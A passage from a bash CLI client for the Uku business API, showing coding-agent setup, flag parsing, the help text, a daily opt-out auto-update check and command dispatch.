  _uku_skill_md > ".cursor/rules/uku.mdc"
  info "Cursor — rule installed (.cursor/rules/uku.mdc)"
}
_setup_codex() {
  local f="AGENTS.md"
  if [ -f "$f" ] && grep -q '<!-- uku:begin -->' "$f" 2>/dev/null; then
    info "AGENTS.md — uku block already present (left as-is)"; return 0
  fi
  { printf '\n<!-- uku:begin -->\n'; _uku_skill_md; printf '<!-- uku:end -->\n'; } >> "$f"
  info "Generic — appended uku block to ./AGENTS.md"
}

cmd_setup() {
  local sub="${1:-agents}"; shift || true
  [ "$sub" = "agents" ] || die "usage: uku setup agents" "$EX_USAGE" @@help.topic setup
  local want="${UKU_SETUP_AGENT:-auto}"
  case "$want" in
    none) info "Skipping agent setup (UKU_SETUP_AGENT=none)."; return 0 ;;
    all) _setup_claude; _setup_cursor; _setup_codex ;;
    claude) _setup_claude ;;
    cursor) _setup_cursor ;;
    codex) _setup_codex ;;
    auto|*)
      local found; found="$(_detect_agent | sort -u)"
      if [ -z "$found" ]; then
        warn "No coding agent detected — installing the shared Claude Code skill anyway."
        _setup_claude
        printf '  %s\n' "$(_dim 'Cursor: uku setup agents (in your project) · Codex/other: adds an AGENTS.md block')" >&2
      else
        printf '%s\n' "$found" | while IFS= read -r a; do case "$a" in
          claude) _setup_claude ;; cursor) _setup_cursor ;; codex) _setup_codex ;;
        esac; done
      fi ;;
  esac
  printf '\n  %s\n  %s %s %s\n' \
    "$(_bold 'Your agent can now operate Uku.')" \
    "$(_dim 'Reads are free · writes ask first ·')" "$(_color 33 'money has its own key.')" "" >&2
  return 0
}

# ── Flag parsing for sub-commands (fills UKU_QUERY, UKU_DATA) ─────────
parse_list_flags() {
  UKU_QUERY=(); UKU_DATA="${UKU_DATA:-}"
  while [ $# -gt 0 ]; do
    case "$1" in
      --limit) _need_val "$@"; UKU_QUERY+=("limit=$2"); shift 2 ;;
      --offset) _need_val "$@"; UKU_QUERY+=("offset=$2"); shift 2 ;;
      --q|--search) _need_val "$@"; UKU_QUERY+=("q=$2"); shift 2 ;;
      # A NAME or an id. A name costs one lookup and is resolved where the
      # path is known (list_resource / uku api), never on a write or a batch.
      --client) _need_val "$@"; UKU_CLIENT_REF="$2"; shift 2 ;;
      --status) _need_val "$@"; UKU_QUERY+=("status=$2"); shift 2 ;;
      --sort) _need_val "$@"; UKU_QUERY+=("sort=$2"); shift 2 ;;
      --query) _need_val "$@"; UKU_QUERY+=("$2"); shift 2 ;;
      --cursor) _need_val "$@"; UKU_QUERY+=("cursor=$2"); shift 2 ;;
      --all) UKU_ALL=1; shift ;;
      --data|-d) _need_val "$@"; UKU_DATA="$2"; shift 2 ;;
      # ── bulk input (see run_batch) ──
      --batch) _need_val "$@"; UKU_BATCH="$2"; shift 2 ;;
      --resume) UKU_RESUME=1; shift ;;
      --run-id) _need_val "$@"; UKU_RUN_ID="$2"; shift 2 ;;
      --stop-on-error) UKU_STOP_ON_ERROR=1; shift ;;
      --retry-unknown) UKU_RETRY_UNKNOWN=1; shift ;;
      --skip-existing) UKU_SKIP_EXISTING=1; shift ;;
      --match-on) _need_val "$@"; UKU_MATCH_ON="$2"; shift 2 ;;
      *) die "unknown flag: $1" "$EX_USAGE" @@help.root ;;
    esac
  done
}

usage() {
  cat <<EOF
$(_bold "uku") — the Uku command-line client (v$UKU_VERSION)

$(_bold "USAGE")
  uku <command> [subcommand] [flags]

$(_bold "AUTH")
  uku auth login              Sign in (stores a scoped API key, 0600)
  uku auth status             Show who you're signed in as
  uku auth logout             Remove stored credentials

$(_bold "FINDING A RECORD")  (you rarely have the id — see: uku help names)
  uku clients get "Acme Ltd"          A name instead of an id. Exactly one
                                      match is used and named on stderr;
                                      several refuse and list the candidates.
  uku clients get 'https://…/41'      A URL you pasted. The host must be this
                                      account's; the last id in it is the id.
  uku tasks list --client "Acme"      Resolve once, filter by client_id
  uku search "acme"                   One --q across the list endpoints that
                                      have a name field. NOT a server-side
                                      search — the API has none. See:
                                      uku help search
  Singular works everywhere: uku client get 41 = uku clients get 41

$(_bold "RESOURCES")  (read with any key · every one takes list [flags] and get <id>)
  uku clients list [--q X] [--status S] [--limit N]      uku clients get <id>
  uku tasks list [--limit N]                             uku tasks get <id>
  uku time list [--limit N]                              uku time get <id>
  uku invoices list [--status draft]                     uku invoices get <id>
  uku members list                                       uku members get <id>
  uku products list                                      uku products get <id>
  uku contracts list                                     uku contracts get <id>
  uku projects list                                      uku projects get <id>

$(_bold "WRITES")  (deliberate — need a TTY or --yes; money needs an All key)
  uku clients create --data @client.json [--yes]         uku clients patch <id> --data @f
  uku tasks create --data @task.json [--yes]             uku tasks patch <id> --data @f
  uku time create --data @entry.json [--yes]      task_id + person_id + start; a
                                      start with no end is a TIMER, not logged work
  uku invoices create --data @invoice.json [--yes]
  No patch for time or invoices — use: uku api PATCH /api/v3/<resource>/<id>

$(_bold "BULK")  (one JSON object per line; one confirm for the whole file)
  uku tasks create --batch @tasks.jsonl --yes
  uku tasks create --batch @tasks.jsonl --resume --yes    Re-run after an
                                      interruption: lines a previous run
                                      already created are skipped, not redone.
  uku batch list · uku batch show <run-id>       What a previous run did
  See: uku help batch

$(_bold "ESCAPE HATCH")  (any endpoint in the API v3 — METHOD and PATH are positional)
  uku api --describe [resource]       The resource map: paths + required fields
  uku api GET  /api/v3/members --query limit=5
  uku api POST /api/v3/tasks --data @task.json --yes

$(_bold "ACCOUNTS")  (one login, many companies — keep a sandbox beside your main firm)
  uku auth login --account sandbox    Sign a second company in
  uku account list                    Show accounts (● = active)
  uku account use <name>              Switch the active account
  uku --account main invoices list    Run one command against a specific account

$(_bold "MORE")
  uku doctor [--json]                 Check PATH, shadowing, tools, creds, skill
  uku setup agents                    Teach your coding agents the uku contract
  uku update                          Upgrade in place to the newest release
                                      (installed from its tag, checksum-verified)
  uku completions <bash|zsh>          Shell completion
  uku me                              Who this key acts as (= uku auth status)
  uku version                         Print the version (= uku --version)
  uku batch list · uku batch show <run-id>       Ledgers of previous --batch runs
  uku help <command>                  A focused card for one command

$(_bold "GLOBAL FLAGS")
  --json            Raw JSON (default when stdout is not a TTY). This is the
                    API's body, unchanged — parse .data
  --agent           One envelope for a program to read, instead of the raw body:
                      {"ok":true,"data":…,"meta":…,"summary":"12 clients",
                       "breadcrumbs":[{"cmd":"uku clients get 1","why":"…"}]}
                    On failure: {"ok":false,"error":…,"code":…,"hint":…} with
                    the same exit code as ever. .data and .meta are exactly what
                    the API returned. Not combinable with --json.
                    uku <command> --help --agent  describes the CLI itself.
  --no-hints        Drop the "Next:" breadcrumb footer (--quiet and --json do too)
  --yes, -y         Confirm a non-interactive write
  --dry-run         Print the request (headers masked) and send nothing. A name
                    or id lookup still runs — it is a read — so what you are
                    shown is the write itself, with the resolved id in the path
  --all             Page through every row (keeps your filters)
  --fields a,b      Keep only these fields: table columns on a TTY, and the keys
                    each row is reduced to in JSON (needs jq)
  --quiet, -q       Suppress the ✓ lines   ·   --no-color
  --batch @f.jsonl  Create one record per JSON line (@- for stdin). Results are
                    JSONL on stdout; progress on stderr. See: uku help batch
  --resume          With --batch: skip lines the run's ledger already created
  --run-id NAME     Name the ledger (default: derived from target + file hash)
  --stop-on-error   With --batch: halt on the first failed line (default: go on)
  --retry-unknown   With --resume: also re-send a line that was sent but never
                    confirmed. Check the server first — it may already exist.
  --skip-existing --match-on FIELD    Query before creating. Read the hazard in
                    uku help batch first — the ledger is the trustworthy path.
  --client <name|id>  Filter a list by client. A name is resolved first (one
                    request, and it refuses rather than guess); an id is sent
                    as it stands. Only where the records carry a client_id —
                    tasks, time, invoices, contracts, projects. The result is
                    then CHECKED: if any row comes back belonging to another
                    client, the endpoint ignored the filter and the command
                    fails (exit 3) instead of passing off an unfiltered list
  --by-id, --by-name  Say how to read the argument that names a record, when it
                    could be either. A client called "12345678" or "CAFE-1" is
                    id-shaped AND a name; on a WRITE the CLI checks for that
                    collision and refuses rather than pick. --by-id takes the
                    argument as an id (no lookup); --by-name resolves it as a
                    name. See: uku help names
  --account <name>  Run against a specific account (default: the active one)
  --base <url>      Override the API base URL
  --header, -H 'K: V'  Add a request header (repeatable; off argv, like the key)
  --if-match <etag> Version check for a write. Omit it and, when the path names
                    a record, a 428 makes the CLI fetch the ETag and re-send
                    once. A collection POST (e.g. POST /api/v3/tasks) has no
                    record to read one from, so pass --if-match yourself there.
                    On 412 it stops — see exit 6.
  -h, --help        This help   ·   --version, -V   The version

$(_bold "EXIT CODES")  0 ok · 1 usage · 2 auth · 3 API error · 4 write refused · 5 network · 6 conflict (412)

$(_bold "RETRY DOCTRINE")
  428  server rejected the write, nothing happened → safe to re-send once with
       If-Match. The CLI does this for you when the path names a record; on a
       collection POST there is no ETag to fetch, so pass --if-match yourself.
  412  someone else changed it → STOP, re-read, re-apply. Never automatic.
  429 / 5xx / timeout  outcome unknown → never auto-retry a write. GET first.
  Reads may be re-issued once, and only when the connection failed — never
  because of an HTTP status.

$(_bold "ENVIRONMENT")  (override stored creds; ideal for CI / agents)
  UKU_API_KEY, UKU_COMPANY, UKU_BASE_URL

Docs: https://app.getuku.com/api/v3/docs   ·   https://getuku.com/agents/
EOF
}

# ── Global pre-parse (pull out global flags anywhere) ────────────────
UKU_JSON=0; UKU_YES=0; UKU_ALL=0; UKU_HELP=0; UKU_DRY=0; UKU_QUIET=0; UKU_FIELDS=""; UKU_QUERY=(); UKU_DATA=""
UKU_AGENT=0; UKU_NO_HINTS=0
UKU_HEADERS=(); UKU_IF_MATCH=""
# A header value goes verbatim into the curl -K config file, whose grammar is
# line-based — so a newline in one would inject a second directive. Reject it.
_check_header_arg() {
  case "$1" in *$'\n'*|*$'\r'*) die "a --header value must be a single line." "$EX_USAGE" ;; esac
  case "$1" in *:*) : ;; *) die "--header wants 'Name: value' (got: $1)" "$EX_USAGE" ;; esac
}
ARGS=()
# The ORIGINAL argv, before the global flags are stripped out of it. A batch
# needs it to print an exact resume command: rebuilding from ARGS alone would
# silently drop --base/--account and point the resume at the wrong company.
UKU_ARGV=(${@+"$@"})
while [ $# -gt 0 ]; do
  case "$1" in
    --json) UKU_JSON=1; shift ;;
    --agent) UKU_AGENT=1; shift ;;
    --no-hints) UKU_NO_HINTS=1; shift ;;
    --header|-H) _need_val "$@"; _check_header_arg "$2"; UKU_HEADERS+=("$2"); shift 2 ;;
    --if-match) _need_val "$@"; _check_header_arg "If-Match: $2"; UKU_IF_MATCH="$2"; shift 2 ;;
    -y|--yes) UKU_YES=1; shift ;;
    --dry-run) UKU_DRY=1; shift ;;
    --by-id)   if [ "$UKU_BY" = "name" ]; then die "--by-id and --by-name are opposites; pass one." "$EX_USAGE" @@help.root; fi; UKU_BY=id; shift ;;
    --by-name) if [ "$UKU_BY" = "id" ];   then die "--by-id and --by-name are opposites; pass one." "$EX_USAGE" @@help.root; fi; UKU_BY=name; shift ;;
    --quiet|-q) UKU_QUIET=1; shift ;;
    --no-color) NO_COLOR=1; export NO_COLOR; shift ;;
    # Validated right here, at the single choke point every value flows
    # through before any command sees it — see _check_fields_arg and
    # _require_valid_name for why (S3/S4/S7).
    --fields) _need_val "$@"; UKU_FIELDS="$2"; _check_fields_arg "$UKU_FIELDS"; shift 2 ;;
    --account) _need_val "$@"; UKU_ACCOUNT_CLI="$2"; _require_valid_name "$UKU_ACCOUNT_CLI"; shift 2 ;;
    --base) _need_val "$@"; UKU_BASE_CLI="$2"; shift 2 ;;
    -h|--help) UKU_HELP=1; shift ;;   # routed to per-command help below
    --version|-V) printf 'uku %s\n' "$UKU_VERSION"; exit "$EX_OK" ;;
    # hidden: the declared surface as one fact per line. Committed as .surface
    # and diffed by scripts/check-surface.sh — the build gate, not a feature.
    # Answered here, before require_curl, so the gate needs nothing installed.
    --dump-surface) _dump_surface; exit "$EX_OK" ;;
    # hidden: the remedy table, slug<TAB>template. scripts/check-drift.sh
    # resolves every template against .surface, so no hint or breadcrumb can
    # name a command the CLI does not have.
    --dump-remedies) _dump_remedies; exit "$EX_OK" ;;
    *) ARGS+=("$1"); shift ;;
  esac
done
set -- ${ARGS[@]+"${ARGS[@]}"}

# --json and --agent are two different promises about the same stdout: raw API
# body vs. an envelope around it. Silently picking one would make the other a
# lie, so say so instead.
if [ "$UKU_AGENT" = "1" ] && [ "$UKU_JSON" = "1" ]; then
  die "--json and --agent are alternatives: --json is the raw API body, --agent wraps it in {ok,data,meta,summary,breadcrumbs}. Pick one." "$EX_USAGE" @@help.root
fi

# ── auto-update ───────────────────────────────────────────────────────
# Updates should reach people without them thinking about it, but not by
# following main HEAD: that would put every push, including work in progress,
# on every machine within a day. So the gate is the VERSION file in the repo —
# we push freely and clients only move when we deliberately bump the number.
#
# VERSION on main is the RELEASE POINTER: the number of the newest tag we have
# published. Polling it is still right, but what a bump triggers is no longer a
# download of main — cmd_update runs the installer, which resolves that same
# pointer to the immutable tag v<version> and refuses to install it without a
# matching checksum. The number we poll and the artefact we install are the
# same release, and the release cannot change after the fact.
#
# Checked at most once a day (a timestamp under UKU_CONFIG_HOME), with a hard
# 3s timeout, and every failure is silent: a CLI must not break because a
# version check could not reach the network.
#
# The replace is safe mid-run because the installer renames into place; the
# running bash keeps reading the old inode. Never overwrite the file in place.
UKU_UPDATE_URL="${UKU_UPDATE_URL:-https://raw.githubusercontent.com/uku-owl/uku-cli/main/VERSION}"
# _ver_gt A B — true when dotted-numeric version A is newer than B (bash 3.2).
_ver_gt() {
  local a="$1" b="$2" x y
  while [ -n "$a$b" ]; do
    x="${a%%.*}"; y="${b%%.*}"
    case "$x" in ''|*[!0-9]*) x=0 ;; esac
    case "$y" in ''|*[!0-9]*) y=0 ;; esac
    if [ "$x" -gt "$y" ]; then return 0; fi
    if [ "$x" -lt "$y" ]; then return 1; fi
    case "$a" in *.*) a="${a#*.}" ;; *) a="" ;; esac
    case "$b" in *.*) b="${b#*.}" ;; *) b="" ;; esac
  done
  return 1
}
auto_update() {
  [ "${UKU_NO_AUTO_UPDATE:-0}" = "1" ] && return 0
  have curl || return 0
  local stamp="$UKU_CONFIG_HOME/last-update-check" now today
  now="$(date +%s 2>/dev/null)" || return 0
  today="$((now - 86400))"
  if [ -f "$stamp" ]; then
    local last; last="$(cat "$stamp" 2>/dev/null || printf '0')"
    case "$last" in (*[!0-9]*|'') last=0 ;; esac
    [ "$last" -gt "$today" ] && return 0
  fi
  mkdir -p "$UKU_CONFIG_HOME" 2>/dev/null || return 0
  # Stamp BEFORE acting: a bumped VERSION that does not match the shipped
  # constant must retry tomorrow, never loop on every invocation.
  printf '%s\n' "$now" > "$stamp" 2>/dev/null || return 0
  local remote
  remote="$(curl -fsS --max-time 3 "$UKU_UPDATE_URL" 2>/dev/null | tr -d '[:space:]')" || return 0
  [ -n "$remote" ] || return 0
  case "$remote" in (*[!0-9.]*) return 0 ;; esac   # ignore anything that is not a version
  # Only ever move FORWARD. A string comparison would "update" a machine whose
  # binary is ahead of main (anyone running a release branch) straight back down
  # — and then do it again tomorrow, forever.
  _ver_gt "$remote" "$UKU_VERSION" || return 0
  warn "uku $remote is available (you have $UKU_VERSION) — updating…"
  cmd_update >&2 2>/dev/null && warn "updated to $remote; it applies to your next command." || true
  return 0
}

require_curl
# --help anywhere → the card for the named command (or global usage).
# With --agent, the same thing as JSON built from the surface table.
if [ "$UKU_HELP" = "1" ]; then
  if [ "$UKU_AGENT" = "1" ]; then _help_agent "${1:-}"; else cmd_help "${1:-}"; fi
  exit "$EX_OK"
fi

cmd="${1:-__firstrun__}"; shift || true
case "$cmd" in
  update|version|help|completions|doctor) : ;;   # never self-update these
  *) auto_update ;;
esac
case "$cmd" in
  __firstrun__) first_run ;;
  auth)     cmd_auth "$@" ;;
  account|accounts) cmd_account "$@" ;;
  setup)    cmd_setup "$@" ;;
  # Singular and plural are the SAME label on the same case arm, not a second
  # arm calling the same function: an alias that is its own code path is a
  # thing that can drift. `uku client get 1` and `uku clients get 1` are one
  # command by construction.
  clients|client)     cmd_clients "$@" ;;
  tasks|task)         cmd_tasks "$@" ;;
  time)               cmd_time "$@" ;;
  invoices|invoice)   cmd_invoices "$@" ;;
  members|member)     cmd_members "$@" ;;
  products|product)   cmd_products "$@" ;;
  contracts|contract) cmd_contracts "$@" ;;
  projects|project)   cmd_projects "$@" ;;
  me)       cmd_me "$@" ;;
  search)   cmd_search "$@" ;;
  api)      cmd_api "$@" ;;
  batch)    cmd_batch "$@" ;;
  doctor)   cmd_doctor "$@" ;;
  setup-agents) cmd_setup agents "$@" ;;
  update)   cmd_update "$@" ;;
  completions) cmd_completions "$@" ;;
  version)  printf 'uku %s\n' "$UKU_VERSION" ;;
  help)     cmd_help "${1:-}" ;;
  *) die "unknown command: $cmd" "$EX_USAGE" @@help.root ;;
esac
